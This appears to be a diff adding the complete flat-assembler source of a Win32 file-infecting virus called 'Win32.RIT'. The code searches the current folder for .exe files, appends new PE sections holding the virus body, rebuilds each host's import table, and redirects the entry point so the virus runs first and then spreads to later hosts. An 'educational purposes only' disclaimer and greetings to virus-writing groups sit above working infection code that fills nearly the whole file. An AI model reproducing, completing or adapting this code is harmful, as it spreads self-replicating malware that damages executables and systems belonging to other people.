@@ -1,0 +1,602 @@
+; Win32.RIT
+; tivuboy
+
+
+; Win32.RIT by tivuboy
+; This virus will rebuild host's import table  with  some
+; needed functions for virus. The first  generation  only
+; infects test.exe, which is defined in filename variable
+; and the next generations will infect all  exes  in  the
+; same folder.
+
+; I use flat assembler 1.67.26 to compile this code.
+
+; This source code is for educational purposes only.
+; I am not responsible for any damages you cause.
+ 
+; My native language is  not  english, so  if  you  can't
+; understand any blocks of code or any comments, trace it
+; in OllyDbg or any other debugger.
+
+; Any comments, ideas or critics are welcome at
+; tivuboy@gmail.com
+
+; Hey, BlueOwl, thank you very much for your beginner tuts
+; Greets to: rRlf, EOF, 29A, F-13
+
+; here the code starts
+format pe gui 4.0
+include 'win32a.inc'
+
+; equates
+	FileSize		equ 20h 	; WIN32_FIND_DATA.nFileSizeLow
+	FileName		equ 2Ch 	; WIN32_FIND_DATA.cFileName
+	FileAttrs		equ 0		; WIN32_FIND_DATA.dwFileAttributes
+	
+	CloseHandl		equ	0
+	CreateFil		equ	4
+	CreateFileMappin	equ	8
+	ExitProces		equ	12
+	FindClos		equ	16
+	FindFirstFil		equ	20
+	FindNextFil		equ	24
+	GlobalAllo		equ	28
+	GlobalFre		equ	32
+	MapViewOfFil		equ	36
+	UnmapViewOfFil		equ	40
+	
+	;open file
+	invoke	CreateFile, filename, GENERIC_READ + GENERIC_WRITE,0, 0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0
+	inc	eax
+	jz	OpenError ;; fail to open file ?
+	dec	eax
+	mov	[filehandle], eax
+	;get file's size
+	invoke	GetFileSize, eax, 0
+	mov	[filesize], eax
+	add	eax, 600h
+	mov	ecx, eax
+	push	ecx	;push file's size for using in mapview func
+	;create file mapping
+	invoke	CreateFileMapping, [filehandle], 0, PAGE_READWRITE, 0, ecx, 0
+	test	eax, eax
+	jz	MapErr
+	mov	[maphandle], eax
+	pop	ecx
+	;map view file
+	invoke	MapViewOfFile, eax, FILE_MAP_WRITE, 0, 0, ecx
+	test	eax, eax
+	jz	MapViewError
+	
+	mov	[mapmem], eax
+	mov	ebx, eax		; ebx = pointer to begin of file
+	add	eax, [eax+3Ch]		; eax = pe header
+	mov	[peheader], eax 	; save it
+	movzx	ecx, word[eax+6]	; ecx = number of section
+	mov	edx, [eax+80h]		;
+	mov	[importTable], edx	; save rva to import table
+	movzx	esi, word[eax+14h]	; esi = SizeOfOptionalHeader
+	add	esi, eax		; esi + peheader offset
+	add	esi, 18h		; esi + 18h->begin of optionalheader
+					; esi points to section table
+	mov	[sectionTable], esi	; save it
+	
+	pushad				; save all the registers
+	
+addNewSection:
+	; add new section for new import table
+	mov	ebx, eax
+	inc	word[eax+6]		; inc number of section
+	mov	edx, 1000h
+	add	[eax+50h], edx		; add SizeOfImage 1000h
+	imul	ecx, 28h		; 
+	add	esi, ecx		; esi points to new section
+	mov	eax, [esi+24h]		; is there any free space
+	test	eax, eax		; to add a new section,
+	jnz	addErr			; if no, exit
+	mov	eax, [esi-28h+$C]	; get VirtualAddr of the last section
+	add	eax, edx
+	mov	[esi+$C], eax		; set section's VirtualAddr
+	mov	[ebx + 80h], eax	; set new import directory rva 
+	mov	[vitualAddr], eax
+	mov	eax, 200h
+	mov	[esi+$10], eax		; set section's RawSize
+	mov	[ebx+84h], eax		; set size of import directory
+	mov	eax, [filesize] 	
+	mov	[esi+14h], eax		; set section's RawAddr
+	mov	eax, $C0000040
+	mov	[esi+24h], eax		; set section's flag: read/write,data
+
+addErr: 
+	popad				; restore all the registers
+	
+SearchImport:				; seach import Table
+	push	esi			; store it
+	add	esi, $C 		; 0xC = VirtualAddr
+	lodsd				; eax = VirtualAddr
+	cmp	eax, edx		; eax = VirtualAddr of ImportTable?
+	je	found
+	pop	esi			; restore
+	add	esi, 28h		; esi points to the next section
+	dec	ecx			; counter = numbersofection?
+	jnz	SearchImport
+
+found:
+	pop	esi			; clear stack
+	mov	esi, [esi+14h]		; esi = rawaddr of import directory
+	add	esi, ebx		; esi = pointer to import directory
+	mov	edi, [filesize]
+	add	edi, ebx		; edi points to rawAddr of the new section
+	
+	xor	edx, edx
+moveIT: 	;move import table
+	mov	ecx, 5			; 5 * 4 = 14h = size of import table
+	rep	movsd			; start transfer
+	inc	edx			; edx = number of import table
+	cmp	dword[esi+$C], 0
+	jnz	moveIT
+	
+	add	edx, 2			; importTable + 2, one is for kernel, one for ended mark
+	imul	eax, edx, 14h		; calculate size of all import table
+	push	eax			; save offset to IAT for using later 
+	add	eax, [vitualAddr]	; end of import table is begin of IAT
+	mov	[edi+10h], eax		; set rva to IAT
+	mov	ecx, [peheader]
+	add	eax, [ecx+34h]
+	mov	[IAT], eax
+	
+	mov	edx, 12 		; edx = number of function + 1
+					; ended mark of IAT has size of 4 byte 0
+	imul	eax, edx, 4		; size of dword is 4 byte
+	add	eax, [esp]		;
+	push	eax			; store offset to lib
+	add	eax, [vitualAddr]	; end of IAT is library name
+	mov	[edi+$C], eax		; set rva to lib
+	add	eax, [ecx+34h]
+	mov	[LibAddr], eax
+	
+	mov	edx, [vitualAddr]
+	
+	mov	edi, [filesize]
+	add	edi, ebx		; edi = rawAddr to import directionary
+	mov	ebx, edi
+	pop	eax
+	add	edi, eax		; edi points to place used to put lib
+	pop	eax
+	add	ebx, eax		; ebx = rawAddr to IAT
+	
+	mov	esi, libname		; esi points to lib's name
+	
+	xor	eax, eax	
+put_lib:
+	lodsb
+	stosb
+	test	eax, eax
+	jz	put_lib_ok
+	jmp	put_lib
+	
+put_lib_ok:
+	
+	mov	esi, funcs		; esi = pointer to functions' name
+	
+	mov	ebp, [mapmem]
+	add	ebp, [filesize] 	; ebp = rawAddr to Import Directory
+	
+	push	edi
+	sub	edi, ebp
+	add	edi, edx
+	mov	[FuncsNameAddr], edi
+	pop	edi
+
+otherjob:	
+	cmp	byte[esi], $EA			; end of funcs
+	jz	ok				; if yes, jmp to out
+	mov	edx, [vitualAddr]		; edx = virtual addr of import section
+	
+set_IAT_entry:
+	sub	edi, ebp			; edi = edi - ebp
+	add	edx, edi			; edx + edi = rva to function
+	add	edi, ebp			; edi = pointer to place used put functions' name
+	mov	[ebx], edx			; set rva to function
+	add	ebx, 4				; ebx = rawaddr to the next iat entry
+	
+	add	edi, 2				; first two byte is ordinal
+
+set_func_name:
+	lodsb
+	stosb					; load a byte in name to mem
+	test	eax, eax			; end of api?
+	jz	otherjob			; if yes, next one
+	jmp	set_func_name
+
+ok:
+	mov	byte [edi], $EA 		; mark end of api functions
+
+	mov	ebx, [mapmem]
+	mov	eax, [peheader]
+
+	; store the original entrypoint
+	mov	edx, [eax+28h]
+	add	edx, [eax+34h]
+	mov	[OEP], edx
+
+; make new section for storing virus
+	mov	edx, [eax+34h]
+	add	[FuncsNameAddr], edx
+	add	edx, [eax+28h]
+	movzx	ecx, word [eax+6]
+	inc	word[eax+6]
+	add	dword[eax+50h], 1000h
+	imul	ecx, ecx, 28h
+	mov	esi, [sectionTable]
+	add	esi, ecx
+	mov	edx, [esi-28h+$C]
+	add	edx, 1000h
+	mov	[eax+28h], edx
+	mov	[esi+$C], edx
+	mov	dword[esi+10h], 400h
+	mov	eax, [esi-28h+14h]
+	add	eax, 200h
+	mov	[esi+14h], eax
+	mov	dword[esi+24h], $E0000020
+	
+	mov	edi, eax
+	add	edi, ebx
+	mov	esi, _virus_start
+	mov	ecx, _virus_end - _virus_start
+	rep	movsb
+	
+	invoke	UnmapViewOfFile, [mapmem]
+MapViewError:
+	invoke	CloseHandle, [maphandle]
+
+MapErr:
+	invoke	CloseHandle, [filehandle]
+	
+OpenError:
+	invoke	ExitProcess, 0
+	
+; this is the code of the 2nd, 3rd and so on genaration
+_virus_start:
+	call	_delta
+_delta:
+	pop	ebp
+	sub	ebp, _delta
+	
+	push	sizeof.WIN32_FIND_DATA
+	push	GMEM_FIXED
+	mov	eax, [ebp+IAT]
+	mov	[ebp+FuncAddr], eax
+	call	dword[eax+GlobalAllo]	; allocate mem for find funcs
+	
+	test	eax, eax
+	jz	FindAllocErr
+	
+	mov	[ebp+FindMem], eax
+	lea	esi, [ebp+_exe]
+	
+	push	eax
+	push	esi
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+FindFirstFil] ; search for the first file
+	
+	inc	eax
+	jz	FindErr
+	dec	eax
+	mov	[FindHandle+ebp], eax
+	
+; find more file and infect them
+_find_more:
+	call	Infect
+	
+	push	[ebp+FindMem]
+	push	[ebp+FindHandle]
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+FindNextFil]	; search for the next files
+	test	eax, eax
+	jnz	_find_more
+	
+	push	[ebp+FindHandle]
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+FindClos]	; close find handle
+	
+FindErr:
+	push	[ebp+FindMem]
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+GlobalFre]	; free find mem
+	
+FindAllocErr:
+	jmp	[ebp+OEP]		; return control to host
+	
+
+Infect:
+	mov	edi, [ebp+FindMem]
+	mov	eax, [edi+FileSize]
+	add	eax, 600h
+	mov	dword[ebp+NewSize], eax ; calculate the new size of exe
+	
+	lea	esi, [edi+FileName]
+	
+	push	0
+	push	dword[edi+FileAttrs]
+	push	OPEN_EXISTING
+	push	0
+	push	0
+	push	GENERIC_READ+GENERIC_WRITE
+	push	esi
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+CreateFil]	; open file
+	
+	inc	eax
+	jz	OpenErr
+	dec	eax
+	mov	[ebp+FileHandle], eax
+	
+	push	0
+	push	[ebp+NewSize]
+	push	0
+	push	PAGE_READWRITE
+	push	0
+	push	eax
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+CreateFileMappin]	; create file's map
+	test	eax, eax
+	jz	CreateMapErr
+	mov	[FileMap+ebp], eax
+	 
+	push	[ebp+NewSize]
+	push	0
+	push	0
+	push	FILE_MAP_WRITE
+	push	eax
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+MapViewOfFil] 	; map file into memory
+	
+	test	eax, eax
+	jz	MapViewErr
+	mov	[ebp+FileMem], eax
+	mov	ebx, eax
+	
+	cmp	word[ebx], 'MZ'
+	jnz	FileErr
+	
+	add	eax, [eax+3Ch]
+	cmp	dword[eax], 'PE'
+	jnz	FileErr
+
+	cmp	dword[eax+40h], 'RIT'
+	jz	FileErr
+	
+	mov	esi, eax
+	add	si, word [eax+14h]
+	add	esi, 18h
+	movzx	ecx, word[eax+6]
+	imul	ecx, ecx, 28h
+	add	esi, ecx
+	
+	cmp	dword[esi+28h+24h], 0
+	jnz	FileErr
+	
+	mov	dword[eax+40h], 'RIT'
+	pushad
+	call	RebuildImportTable
+	popad
+	
+	add	esi, 28h
+	
+	mov	edx, [eax+34h]
+	add	[ebp+IAT], edx
+	add	[ebp+LibAddr], edx
+	add	[ebp+FuncsNameAddr], edx
+
+	; store original entry poin
+	add	edx, [eax+28h]
+	mov	[ebp+OEP], edx
+
+	inc	word[eax+6]		; increase number of setions
+	add	dword[eax+50h], 1000h	; increase SizeOfImage by 1000h
+
+	; add new section for virus
+	mov	dword[esi+10h], 400h		; set RawSize
+	mov	dword[esi+24h], $C0000040	; set Read/Write/InitData flags
+	mov	edx, [esi-28h+$C]		; get the previous section's VirtualAddr
+	add	edx, 1000h
+	mov	[eax+28h], edx			; set Entrypoint to virus
+	mov	[esi+$C], edx			; set VirtualAddr
+	mov	eax, [esi-28h+14h]		; get the previous section's RaWAddr
+	add	eax, 200h
+	mov	[esi+14h], eax			; set RawAddr
+	
+	mov	edi, eax
+	add	edi, ebx
+	lea	esi, [ebp+_virus_start] 	; edi = pointer to beginning of the last section
+	mov	ecx, _virus_end - _virus_start
+	
+	rep	movsb
+
+FileErr:
+	push	ebx
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+UnmapViewOfFil]
+						; un map file's view
+MapViewErr:
+	push	[ebp+FileMap]
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+CloseHandl]	; close map's handle
+	
+CreateMapErr:
+	push	[ebp+FileHandle]
+	mov	eax, [ebp+FuncAddr]
+	call	dword[eax+CloseHandl]	; Close File's Handle
+	
+OpenErr:
+	ret
+	
+
+RebuildImportTable:
+
+	; add new section
+	inc	word[eax+6]
+	add	dword[eax+50h], 1000h
+	
+	mov	dword[esi+10h], 200h
+	mov	dword[esi+24h], 0xC0000040
+	mov	edx, [esi-28h+$C]
+	add	edx, 1000h
+	mov	[ebp+VirtualAddr], edx
+	push	edx
+	mov	dword[eax+84h], 200h
+	mov	[esi+0xC], edx
+	mov	edx, [esi-28h+10h]
+	add	edx, [esi-28h+14h]
+	mov	[esi+14h], edx
+	
+	mov	[ebp+RawAddr], edx
+	mov	edi, edx
+	add	edi, ebx
+	
+	mov	edx, [eax+80h]
+	
+SearchRVAImportTable:
+	cmp	[esi+0xC], edx
+	jz	FindIt
+	sub	esi, 28h
+	jmp	SearchRVAImportTable
+	
+FindIt:
+	pop	edx				; edx = VirtualAddr
+	mov	[eax+80h], edx			; set new RVA of Import Directory
+	
+	mov	esi, [esi+14h]
+	add	esi, ebx			; esi = pointer to RawAddr of import table
+	
+MoveImportDir:
+	cmp	dword[esi+$C], 0		; $C is offset of library name
+	jz	EndOfImportDir
+	
+	mov	ecx, 5
+	rep	movsd				; move it
+	jmp	MoveImportDir
+	
+EndOfImportDir:
+	
+	mov	ecx, 28h			; size of 2 import directory (14h*2)
+	add	ecx, edi			; edi = end of host's import directories
+	sub	ecx, ebx			; ebx = beginning of host in memory
+	sub	ecx, [ebp+RawAddr]
+	add	ecx, [ebp+VirtualAddr]
+	mov	[edi+$10], ecx			; set rva of import address table (FirstThunk)
+	mov	[ebp+IAT], ecx			; it will use to get address of func
+	
+	mov	eax, 12
+	shl	eax, 2				; there are 11 functions and 1 for ended mark
+	push	eax				; its entry has size is 4 bytes
+	add	eax, ecx			; end of IAT is beginning of library name
+	mov	[edi+0xC], eax			; set library name
+	mov	[ebp+LibAddr], eax
+	pop	eax
+	
+	add	edi, 28h
+	push	edi
+	add	edi, eax
+	mov	esi, [ebp+LibAddr]		; esi = pointer to library name
+	
+SetLib:
+	lodsb
+	stosb
+	test	eax, eax
+	jnz	SetLib
+	
+	pop	edx
+	mov	ecx, [ebp+VirtualAddr]
+	mov	esi, [ebp+FuncsNameAddr]
+	
+	push	edi
+	sub	edi, ebx
+	sub	edi, [ebp+RawAddr]
+	add	edi, ecx
+	mov	[ebp+FuncsNameAddr], edi
+	pop	edi
+	
+SetFuncAndRVA:
+	cmp	byte[esi], $EA
+	je	SetFuncAndRVA_ok
+	
+	push	edi
+		
+	sub	edi, ebx
+	sub	edi, [ebp+RawAddr]
+	add	edi, ecx
+	mov	[edx], edi
+	add	edx, 4
+	
+	pop	edi
+	add	edi, 2
+	add	esi, 2
+	
+SetFuncName:
+	lodsb
+	stosb
+	test	al, al
+	jnz	SetFuncName
+	jmp	SetFuncAndRVA
+	
+SetFuncAndRVA_ok:
+	mov	byte[edi], $EA
+	
+	ret
+	
+; data
+	FileHandle	dd	0
+	FileMap 	dd	0
+	FileMem 	dd	0
+	FindHandle	dd	0
+	FindMem 	dd	0
+	
+	FuncAddr	dd	0
+	FuncsNameAddr	dd	0
+	LibAddr 	dd	0
+	IAT		dd	0
+	RawAddr 	dd	0
+	VirtualAddr	dd	0
+
+	NewSize 	dd	0
+	OEP		dd	0
+	
+	_exe		db	'*.exe', 0
+_virus_end:
+
+filehandle	dd	0
+maphandle	dd	0
+mapmem		dd	0
+importTable	dd	0
+sectionTable	dd	0
+peheader	dd	0
+filesize	dd	0
+vitualAddr	dd	0
+filename	db	'test.exe', 0
+libname 	db	'kernel32.dll', 0
+
+funcs:
+	db	'CloseHandle', 0
+	db	'CreateFileA', 0
+	db	'CreateFileMappingA', 0
+	db	'ExitProcess', 0
+	db	'FindClose', 0
+	db	'FindFirstFileA', 0
+	db	'FindNextFileA', 0
+	db	'GlobalAlloc', 0
+	db	'GlobalFree', 0
+	db	'MapViewOfFile', 0
+	db	'UnmapViewOfFile', 0
+	db	$EA			;mark end of functions
+
+
+data import
+	library kernel32,'kernel32.dll',\
+		user32,'user32.dll'
+	
+	include 'api/kernel32.inc'
+	include 'api/user32.inc'
+end data
+
